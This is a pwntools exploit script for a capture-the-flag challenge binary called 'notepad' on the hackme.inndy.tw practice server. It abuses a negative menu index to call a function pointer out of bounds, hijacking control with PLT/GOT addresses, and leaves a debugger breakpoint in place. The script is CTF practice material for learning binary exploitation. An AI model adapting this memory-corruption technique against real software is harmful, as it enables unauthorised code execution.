#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'i386'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./notepad")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./notepad")
    libc = elf.libc


else:
    io = remote("hackme.inndy.tw", 7713)
    libc = ELF("./libc-2.23.so.i386")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Init():
    io.sendlineafter("::>", "c")

def New(size, content):
    io.sendlineafter("::>", "a")
    io.sendlineafter(" > ", str(size))
    io.sendlineafter(" > ", content)

def Open(idx, content, choice, edit = 'n'):
    io.sendlineafter("::>", "b")
    io.sendlineafter(" > ", str(idx))
    io.sendlineafter(")", edit)
    if edit == 'y':
        io.sendlineafter(" > ", content)

    io.sendlineafter("::>", chr(choice + 97))


if __name__ == "__main__":
    Init()
    New(16, p32(elf.plt['strncpy'])) # -6
    New(16, '111')
    DEBUG("b *0x8048CBF\nc")
    Open(1, p32(elf.got['printf']), -6, 'y') # elf.plt['printf'] contains \x00


    io.interactive()
    io.close()



